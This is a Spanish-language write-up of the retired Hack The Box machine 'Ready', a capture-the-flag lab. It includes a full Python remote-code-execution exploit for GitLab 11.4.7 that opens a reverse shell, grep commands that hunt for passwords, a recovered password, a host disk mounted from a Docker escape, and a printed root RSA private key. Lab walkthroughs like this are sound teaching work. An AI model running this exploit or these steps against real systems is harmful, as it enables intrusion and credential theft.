---
layout: post
title:  "Maquina  Retirada Ready de Hack The Box (Necesario VIP)"
description: En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada READY
tags: HTB, RCE, GitLab, Web Hacking, Maquinas Retiradas, Writeup
---

# Ready ~ Hack The Box

Realizamos el Primer escaneo con Nmap
```bash
$" nmap -p- --open -sS --min-rate 4000 -vvv -n -Pn -oG allports 10.10.10.220       "
``` 
Procedemos con el siguiente escaneo de Nmap
```bash
$" nmap -sC -sV -p80 -oN target 10.10.10.220       "
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
5080/tcp open  http    nginx
| http-robots.txt: 53 disallowed entries (15 shown)
| / /autocomplete/users /search /api /admin /profile 
| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
|_/s/ /snippets/new /snippets/*/edit
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://10.10.10.220:5080/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
``` 
Lanzamos la herramienta whatweb para averiguar mas info sobre el puerto 5080 http
```bash
# cat Wweb              
http://10.10.10.220:5080 [302 Found] Country[RESERVED][ZZ], HTTPServer[nginx], IP[10.10.10.220], RedirectLocation[http://10.10.10.220:5080/users/sign_in], Strict-Transport-Security[max-age=31536000],
UncommonHeaders[x-content-type-options,x-request-id], X-Frame-Options[DENY], X-UA-Compatible[IE=edge],X-XSS-Protection[1; mode=block], nginx
http://10.10.10.220:5080/users/sign_in [200 OK] Cookies[_gitlab_session], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx], HttpOnly[_gitlab_session], IP[10.10.10.220], Open-Graph-Protocol,
PasswordField[new_user[password],user[password]], Script, Strict-Transport-Security[max-age=31536000], Title[Sign in · GitLab], UncommonHeaders[x-content-type-options,x-request-id], X-Frame-Options[DENY], X-UA-Compatible[IE=edge], X-XSS-Protection[1; mode=block], nginx
```
Encontramos en la direccion esta  http://10.10.10.220:5080/users/sign_in el panel de login o de registro de session
Procedemos a registrarnos como un usuario corriente
Una vez dentro intentamos enumerar la version de GitLab:
`GitLab Community Edition 11.4.7`
Procedemos a hacer una busqueda en `searchsploit` por la version de `GitLab 11.4.7`
```bash
# searchsploit GitLab 11.4.7                  
---------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                      |  Path
---------------------------------------------------------------------------------------------------- ---------------------------------
GitLab 11.4.7 - RCE (Authenticated)                                                                 | ruby/webapps/49334.py
Gitlab 11.4.7 - Remote Code Execution                                                               | ruby/webapps/49257.py
GitLab 11.4.7 - Remote Code Execution (Authenticated)                                               | ruby/webapps/49263.py
---------------------------------------------------------------------------------------------------- ---------------------------------
```
Vemos que tenemos un RCE sin Authenticated vamos a ver si podemos hacer uso del mismo:
```python
# Exploit Title: Gitlab 11.4.7 - Remote Code Execution
# Date: 14-12-2020
# Exploit Author: Fortunato Lodari fox [at] thebrain [dot] net, foxlox
# Vendor Homepage: https://about.gitlab.com/
# POC: https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/
# Tested On: Debian 10 + Apache/2.4.46 (Debian)
# Version: 11.4.7 community

import sys
import requests
import time
import random
import http.cookiejar
import os.path
from os import path

# Sign in GitLab 11.4.7  portal and get (using Burp or something other):
# authenticity_token
# authenticated cookies
# username
# specify localport and localip for reverse shell

username='paco' # Cambiar este valor
authenticity_token='Vjf0sSmklmkJexT5KAfn0FFHY9HK1jV3RPx7pNOs2R89AaK7P+3Z2cAmp2XrZJ8wWo3mA/Ji4HrBGCf1JQUtwA=='  # Cambiar este valor
cookie = '_gitlab_session=18f7804912c391d79524197f59ae77f1; sidebar_collapsed=false'  # Cambiar este valor
localport='443'  # Cambiar este valor
localip='10.10.14.5'  # Cambiar este valor


url = "http://10.10.10.200:5080"  # Cambiar este valor
proxies = { "http": "http://localhost:8080" }


def deb(str):
    print("Debug => "+str)

def create_payload(authenticity_token,prgname,namespace_id,localip,localport,username):
    return {'utf8':'✓','authenticity_token':authenticity_token,'project[ci_cd_only]':'false','project[name]':prgname,'project[namespace_id]':namespace_id,'project[path]':prgname,'project[description]':prgname,'project[visibility_level]':'20','':'project[initialize_with_readme]','project[import_url]':'git://[0:0:0:0:0:ffff:127.0.0.1]:6379>

import string
def random_string(length):
    return ''.join(random.choice(string.ascii_letters) for m in range(length))

def init(username,cookie,authenticity_token,localport,localip):
    from bs4 import BeautifulSoup
    import re
    import urllib.parse
    deb("Token: "+authenticity_token)
    deb("Cookie: "+cookie)
    session=requests.Session()
    headers = {'user-agent':'Moana Browser 1.0','Cookie':cookie,'Content-Type':'application/x-www-form-urlencoded','DNT':'1','Upgrade-Insecure-Requests':'1'}
    r=session.get(url+'/projects/new',headers=headers,allow_redirects=True)
    soup = BeautifulSoup(r.content,"lxml")
    nsid = soup.findAll('input', {"id": "project_namespace_id"})
    namespace_id=nsid[0]['value'];
    deb("Namespace ID: "+namespace_id)
    prgname=random_string(8)
    newpayload=create_payload(authenticity_token,prgname,namespace_id,localip,localport,username)
    newpayload=urllib.parse.urlencode(newpayload)
    deb("Payload encoded: "+newpayload)
    r=session.post(url+'/projects',newpayload,headers=headers,allow_redirects=False)
    os.system("nc -nvlp "+localport)

init(username,cookie,authenticity_token,localport,localip)
```

Lo lanzamos y nos devuelve una shell como el user `git` atraves del mismo exploit
Una vez dentro de la maquina victima nos ponemos a enumerar el sistema y vemos que estamos en un Docker(contenedor). 
Nos movemos a `/home/dude/` y ya podriamos visualizar la flag `Users.txt: e1e30b052b6ec06706........`

# Escalada de privilegios y acceso a los archivos de la Maquina Victima.

Procedemos a enumerar el sistema como siempre:
```bash
find / -perm -u=s type f 2>/dev/null
grep -r -i "password"
grep -r -i -E "password|key|databases|user"
```
Nos movemos a la ruta `/opt/backup` usamos el comando anterior `grep -r -i "password"`
y conseguimos sacar una password relacionada con el servicio SMTP `"wW59U!ZKMbG9+*#h"`
probamos la reutilizacion de credenciales y instentamos hacer un cambio al user root con la password encontrada. Funciona.

# Consiguiendo Acceso a la maquina Victima como Root

Una vez somos root en el Docker vemos con el comando 
```bash
$ df -l 
y vemos las particiones de la maquina(COMPLETAR)
```
Encontramos una particion que pesa como 12g y aparece referenciada a `/root_pass`
Porque no ? Vamos a porbar a movernos a la ruta `/mnt/` y crearnos un directorio para hacer uso de una mountura y montar el sistema de archivos en este directorio.
```bash
"root@gitlab:/# cd mnt    "
"root@gitlab:/mnt# mkdir qdmSto              "                                                                                                                                                                        
"root@gitlab:/mnt# mount /dev/sda2 qdmSto/  "                                                                                                                                                                         
"root@gitlab:/mnt# cd qdmSto/ "
"root@gitlab:/mnt/qdmSto# ls -la "                                                                                                                                                                                    
total 100                                                                                                                                                                                                           
drwxr-xr-x  20 root root  4096 Dec  7 17:44 .                                                                                                                                                                       
drwxr-xr-x   1 root root  4096 May 18 09:21 ..
lrwxrwxrwx   1 root root     7 Apr 23  2020 bin -> usr/bin
drwxr-xr-x   3 root root  4096 Jul  3  2020 boot
drwxr-xr-x   2 root root  4096 May  7  2020 cdrom
drwxr-xr-x   5 root root  4096 Dec  4 15:20 dev
drwxr-xr-x 101 root root  4096 Feb 11 14:31 etc
drwxr-xr-x   3 root root  4096 Jul  7  2020 home
lrwxrwxrwx   1 root root     7 Apr 23  2020 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Apr 23  2020 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Apr 23  2020 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Apr 23  2020 libx32 -> usr/libx32
drwx------   2 root root 16384 May  7  2020 lost+found
drwxr-xr-x   2 root root  4096 Apr 23  2020 media
drwxr-xr-x   2 root root  4096 Apr 23  2020 mnt
drwxr-xr-x   3 root root  4096 Jun 15  2020 opt
drwxr-xr-x   2 root root  4096 Apr 15  2020 proc
drwx------  10 root root  4096 Dec  7 17:02 root
drwxr-xr-x  10 root root  4096 Apr 23  2020 run
lrwxrwxrwx   1 root root     8 Apr 23  2020 sbin -> usr/sbin
drwxr-xr-x   6 root root  4096 May  7  2020 snap
drwxr-xr-x   2 root root  4096 Apr 23  2020 srv
drwxr-xr-x   2 root root  4096 Apr 15  2020 sys
drwxrwxrwt  13 root root 12288 May 18 09:22 tmp
drwxr-xr-x  14 root root  4096 Apr 23  2020 usr
drwxr-xr-x  14 root root  4096 Dec  4 15:20 var
"root@gitlab:/mnt/qdmSto# cd root/   "
"root@gitlab:/mnt/qdmSto/root# ls    "
docker-gitlab  ready-channel  root.txt  snap
"root@gitlab:/mnt/qdmSto/root# cat root.txt    "
b7f98681505cd39066
```
Aqui ya tendriamos acceso de lectura a el sistema de archivos de la maquina como puede ser la Flag root.txt
Ahora el siguiente paso seria buscar por algun archivo clave en la ruta `/root/.ssh/` 
```bash
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAvyovfg++zswQT0s4YuKtqxOO6EhG38TR2eUaInSfI1rjH09Q
sle1ivGnwAUrroNAK48LE70Io13DIfE9rxcotDviAIhbBOaqMLbLnfnnCNLApjCn
6KkYjWv+9kj9shzPaN1tNQLc2Rg39pn1mteyvUi2pBfA4ItE05F58WpCgh9KNMlf
YmlPwjeRaqARlkkCgFcHFGyVxd6Rh4ZHNFjABd8JIl+Yaq/pg7t4qPhsiFsMwntX
TBKGe8T4lzyboBNHOh5yUAI3a3Dx3MdoY+qXS/qatKS2Qgh0Ram2LLFxib9hR49W
rG87jLNt/6s06z+Mwf7d/oN8SmCiJx3xHgFzbwIDAQABAoIBACeFZC4uuSbtv011
YqHm9TqSH5BcKPLoMO5YVA/dhmz7xErbzfYg9fJUxXaIWyCIGAMpXoPlJ90GbGof
Ar6pDgw8+RtdFVwtB/BsSipN2PrU/2kcVApgsyfBtQNb0b85/5NRe9tizR/Axwkf
iUxK3bQOTVwdYQ3LHR6US96iNj/KNru1E8WXcsii5F7JiNG8CNgQx3dzve3Jzw5+
lg5bKkywJcG1r4CU/XV7CJH2SEUTmtoEp5LpiA2Bmx9A2ep4AwNr7bd2sBr6x4ab
VYYvjQlf79/ANRXUUxMTJ6w4ov572Sp41gA9bmwI/Er2uLTVQ4OEbpLoXDUDC1Cu
K4ku7QECgYEA5G3RqH9ptsouNmg2H5xGZbG5oSpyYhFVsDad2E4y1BIZSxMayMXL
g7vSV+D/almaACHJgSIrBjY8ZhGMd+kbloPJLRKA9ob8rfxzUvPEWAW81vNqBBi2
3hO044mOPeiqsHM/+RQOW240EszoYKXKqOxzq/SK4bpRtjHsidSJo4ECgYEA1jzy
n20X43ybDMrxFdVDbaA8eo+og6zUqx8IlL7czpMBfzg5NLlYcjRa6Li6Sy8KNbE8
kRznKWApgLnzTkvupk/oYSijSliLHifiVkrtEY0nAtlbGlgmbwnW15lwV+d3Ixi1
KNwMyG+HHZqChNkFtXiyoFaDdNeuoTeAyyfwzu8CgYAo4L40ORjh7Sx38A4/eeff
Kv7dKItvoUqETkHRA6105ghAtxqD82GIIYRy1YDft0kn3OQCh+rLIcmNOna4vq6B
MPQ/bKBHfcCaIiNBJP5uAhjZHpZKRWH0O/KTBXq++XQSP42jNUOceQw4kRLEuOab
dDT/ALQZ0Q3uXODHiZFYAQKBgBBPEXU7e88QhEkkBdhQpNJqmVAHMZ/cf1ALi76v
DOYY4MtLf2dZGLeQ7r66mUvx58gQlvjBB4Pp0x7+iNwUAbXdbWZADrYxKV4BUUSa
bZOheC/KVhoaTcq0KAu/nYLDlxkv31Kd9ccoXlPNmFP+pWWcK5TzIQy7Aos5S2+r
ubQ3AoGBAIvvz5yYJBFJshQbVNY4vp55uzRbKZmlJDvy79MaRHdz+eHry97WhPOv
aKvV8jR1G+70v4GVye79Kk7TL5uWFDFWzVPwVID9QCYJjuDlLBaFDnUOYFZW52gz
vJzok/kcmwcBlGfmRKxlS0O6n9dAiOLY46YdjyS8F8hNPOKX6rCd
-----END RSA PRIVATE KEY-----
```
Y procedemos a Conectarmos por SSH a la Maquina Victima:
```bash
# "ssh -i id_rsa root@10.10.10.220      "                                                                                                                                                                     130 ⨯
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 18 May 2021 09:29:05 AM UTC

  System load:                      0.01
  Usage of /:                       64.6% of 17.59GB
  Memory usage:                     72%
  Swap usage:                       0%
  Processes:                        347
  Users logged in:                  0
  IPv4 address for br-bcb73b090b3f: 172.19.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for ens160:          10.10.10.220
  IPv6 address for ens160:          dead:beef::250:56ff:feb9:c391

  => There are 18 zombie processes.

 * Introducing self-healing high availability clusters in MicroK8s.
   Simple, hardened, Kubernetes for production, from RaspberryPi to DC.

     https://microk8s.io/high-availability

186 updates can be installed immediately.
89 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu Feb 11 14:28:18 2021
"root@ready:~# "
```

